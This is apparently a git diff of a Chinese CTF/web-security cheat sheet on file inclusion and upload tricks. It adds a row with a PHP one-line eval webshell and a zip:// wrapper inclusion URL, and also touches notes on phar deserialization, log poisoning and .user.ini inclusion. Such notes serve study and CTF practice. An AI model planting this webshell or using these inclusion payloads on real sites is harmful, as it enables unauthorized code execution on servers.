@@ -7,6 +7,7 @@
 | `?file=index` 或 `?file=index.php` 有可能需要去掉 .php |                                                                                                                                                 |     |
 | PHP_INCLUDE_TO_SHELL_CHAR_DICT                         | 文件包含即命令执行                                                                                                                              |     |
 | glob://                                                |                                                                                                                                                 |     |
+| 上传 a.zip 改为 a.jpg                                  | zip://伪协议进行包含 一句话 a.php `<?php @eval($_POST['a'])?>` <br>url: `http://xxx//index.php?url=zip:///app/upload/pic.jpg%23a` 密码为 a      |
 | 日志包含                                               | 1.抓包修改 Agent 访问 2.包含日志 /var/log/nginx/access.log                                                                                      |
 | 使用 [.user.ini](#userini) 进行包含                    | auto_append_file=2.jpg                                                                                                                          |
 | Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7                   | [CVE-2013-4547](exp/Nginx%20%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2013-4547%EF%BC%89.md) requests_demo.py |
@@ -30,8 +31,9 @@
 
 - 压缩包软链接，传到/tmp/data 下, ，这个软链接指向 flag，即可获取 flag
 - %00 截断 php 版本小于 5.3.4
-- 上传时和文件相关都可能是phar反序列化,如 `file_exists($filename)` 考虑 phar 反序列化 `phar://abc.phar.gif/test.txt`
-  - 能进行攻击的远不至于file_get_contents，所有的文件函数都会导致这个问题
+- 上传时和文件相关都可能是 phar 反序列化,如 `file_exists($filename)` 考虑 phar 反序列化 `phar://abc.phar.gif/test.txt`
+  - 能进行攻击的远不至于 file_get_contents，所有的文件函数都会导致这个问题
+
 ```sh
 fileatime / filectime / filemtime
 stat / fileinode / fileowner / filegroup / fileperms
@@ -41,7 +43,6 @@ parse_ini_file
 unlink
 copy
 ```
-
 
 # 文件读取
 
